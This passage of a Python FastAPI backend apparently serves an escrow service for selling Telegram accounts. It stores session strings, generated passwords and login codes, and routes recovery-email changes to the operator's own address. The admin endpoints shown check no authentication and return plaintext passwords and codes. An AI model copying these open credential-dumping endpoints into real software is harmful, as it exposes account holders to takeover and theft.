                "delivery_status": acc.delivery_status.value if acc.delivery_status else None,
                "delivery_count": acc.delivery_count or 0,
                "created_at": acc.created_at.isoformat() if acc.created_at else None,
                "completed_at": acc.completed_at.isoformat() if acc.completed_at else None,
                "delivered_at": acc.delivered_at.isoformat() if acc.delivered_at else None
            }
            
            # Categorize based on status and delivery_status
            if acc.status and acc.status.value == "expired":
                expired_accounts.append(account_data)
            elif acc.delivery_status and acc.delivery_status.value in ["delivered", "buyer_delivered"]:
                delivered_accounts.append(account_data)
            elif acc.status and acc.status.value == "completed" and acc.generated_password:
                # Completed accounts with password are ready (even if session missing)
                ready_accounts.append(account_data)
            elif acc.pyrogram_session and acc.generated_password:
                ready_accounts.append(account_data)
            else:
                pending_accounts.append(account_data)
        
        return {
            "status": "success",
            "summary": {
                "total": len(accounts),
                "ready": len(ready_accounts),
                "pending": len(pending_accounts),
                "delivered": len(delivered_accounts),
                "expired": len(expired_accounts)
            },
            "ready_accounts": ready_accounts,
            "pending_accounts": pending_accounts,
            "delivered_accounts": delivered_accounts,
            "expired_accounts": expired_accounts
        }


@router.get("/admin/account/{account_id}")
async def get_account_details_admin(account_id: str):
    """
    Get full details of a specific account (Admin endpoint)
    """
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    # Check session status
    manager = get_pyrogram()
    session_status = "unknown"
    try:
        check = await manager.get_me_info(phone)
        session_status = "active" if check.get("status") == "success" else "inactive"
    except:
        session_status = "inactive"
    
    return {
        "status": "success",
        "account": {
            "phone": account.phone,
            "telegram_id": account.telegram_id,
            "status": account.status.value if account.status else "unknown",
            "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
            "password": account.generated_password,
            "target_email": account.target_email,
            "email_hash": account.email_hash,
            "email_changed": account.email_changed or False,
            "has_2fa": account.has_2fa or False,
            "audit_passed": account.audit_passed or False,
            "has_pyrogram_session": account.pyrogram_session is not None,
            "has_telethon_session": account.telethon_session is not None,
            "session_status": session_status,
            "delivery_status": account.delivery_status.value if account.delivery_status else None,
            "delivery_count": account.delivery_count or 0,
            "created_at": account.created_at.isoformat() if account.created_at else None,
            "completed_at": account.completed_at.isoformat() if account.completed_at else None
        }
    }


@router.post("/admin/account/{account_id}/fix")
async def fix_account_admin(account_id: str, request: dict = None):
    """
    Fix account data manually (Admin endpoint)
    Can reset delivery_count, fix status, etc.
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select, update as sql_update
    
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(
            select(Account).where(Account.phone == phone)
        )
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        updates = {}
        
        # Handle different fix operations
        if request:
            if "reset_delivery_count" in request and request["reset_delivery_count"]:
                updates["delivery_count"] = 0
                updates["delivered_at"] = None
            
            if "set_status" in request:
                status_map = {
                    "completed": AuthStatus.COMPLETED,
                    "authenticated": AuthStatus.AUTHENTICATED,
                    "pending_code": AuthStatus.PENDING_CODE,
                    "audit_passed": AuthStatus.AUDIT_PASSED
                }
                if request["set_status"] in status_map:
                    updates["status"] = status_map[request["set_status"]]
            
            if "set_delivery_status" in request:
                ds_map = {
                    "bot_received": DeliveryStatus.BOT_RECEIVED,
                    "ready": DeliveryStatus.READY,
                    "buyer_delivered": DeliveryStatus.BUYER_DELIVERED
                }
                if request["set_delivery_status"] in ds_map:
                    updates["delivery_status"] = ds_map[request["set_delivery_status"]]
            
            if "set_has_2fa" in request:
                updates["has_2fa"] = request["set_has_2fa"]
            
            if "set_audit_passed" in request:
                updates["audit_passed"] = request["set_audit_passed"]
        
        if updates:
            for key, value in updates.items():
                setattr(account, key, value)
            await session.commit()
        
        return {
            "status": "success",
            "message": f"Account {phone} updated",
            "updates": {k: str(v) for k, v in updates.items()}
        }


@router.get("/admin/account/{account_id}/raw")
async def get_account_raw_admin(account_id: str):
    """
    Get raw account data from database (Admin endpoint)
    Shows all fields exactly as stored
    """
    from backend.models.database import async_session, Account
    from sqlalchemy import select
    
    phone = account_id
    
    async with async_session() as session:
        result = await session.execute(
            select(Account).where(Account.phone == phone)
        )
        account = result.scalar_one_or_none()
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        return {
            "status": "success",
            "raw_data": {
                "phone": account.phone,
                "telegram_id": account.telegram_id,
                "first_name": account.first_name,
                "status": account.status.value if account.status else None,
                "pyrogram_session": "EXISTS" if account.pyrogram_session else None,
                "pyrogram_session_length": len(account.pyrogram_session) if account.pyrogram_session else 0,
                "telethon_session": "EXISTS" if account.telethon_session else None,
                "has_2fa": account.has_2fa,
                "has_recovery_email": account.has_recovery_email,
                "other_sessions_count": account.other_sessions_count,
                "generated_password": account.generated_password,
                "delivery_status": account.delivery_status.value if account.delivery_status else None,
                "last_code": account.last_code,
                "transfer_mode": account.transfer_mode.value if account.transfer_mode else None,
                "email_hash": account.email_hash,
                "target_email": account.target_email,
                "email_changed": account.email_changed,
                "email_verified": account.email_verified,
                "delivery_count": account.delivery_count,
                "pyrogram_healthy": account.pyrogram_healthy,
                "telethon_healthy": account.telethon_healthy,
                "audit_passed": account.audit_passed,
                "audit_issues": account.audit_issues,
                "created_at": account.created_at.isoformat() if account.created_at else None,
                "updated_at": account.updated_at.isoformat() if account.updated_at else None,
                "completed_at": account.completed_at.isoformat() if account.completed_at else None,
                "delivered_at": account.delivered_at.isoformat() if account.delivered_at else None
            }
        }


# ============== Documentation Endpoint ==============

@router.get("/docs/internal")
async def get_internal_docs():
    """Get internal API documentation"""
    return {
        "title": "Telegram Escrow Auditor API V3",
        "version": "3.0.0",
        "description": "Simplified and unified API for Telegram account escrow",
        "endpoints": {
            "authentication": [
                {"method": "POST", "path": "/api/v1/auth/init", "description": "Initialize authentication"},
                {"method": "POST", "path": "/api/v1/auth/verify", "description": "Verify code/2FA"}
            ],
            "account": [
                {"method": "GET", "path": "/api/v1/account/audit/{account_id}", "description": "Run security audit"},
                {"method": "POST", "path": "/api/v1/account/finalize/{account_id}", "description": "Finalize account"}
            ],
            "email": [
                {"method": "GET", "path": "/api/v1/email/target/{account_id}", "description": "Get target email"},
                {"method": "GET", "path": "/api/v1/email/code/{account_id}", "description": "Check for email code"},
                {"method": "POST", "path": "/api/v1/email/confirm/{account_id}", "description": "Confirm email changed"}
            ],
            "sessions": [
                {"method": "GET", "path": "/api/v1/sessions/health/{account_id}", "description": "Check session health"},
                {"method": "POST", "path": "/api/v1/sessions/regenerate/{account_id}", "description": "Regenerate sessions"}
            ],
            "delivery": [
                {"method": "POST", "path": "/api/v1/delivery/request-code/{account_id}", "description": "Request delivery code"},
                {"method": "POST", "path": "/api/v1/delivery/confirm/{account_id}", "description": "Confirm delivery"}
            ]
        },
        "transfer_modes": {
            "bot_only": "User exits completely, only bot sessions remain",
            "user_keeps_session": "User keeps one session, shares control"
        },
        "email_flow": [
            "1. Get target email via /email/target",
            "2. User changes Telegram recovery email to target",
            "3. Telegram sends verification code to our email",
            "4. Webhook receives code at /api3/webhook",
            "5. Frontend checks /email/code to get code",
            "6. User enters code in Telegram to confirm",
            "7. Call /email/confirm to verify change"
        ]
    }
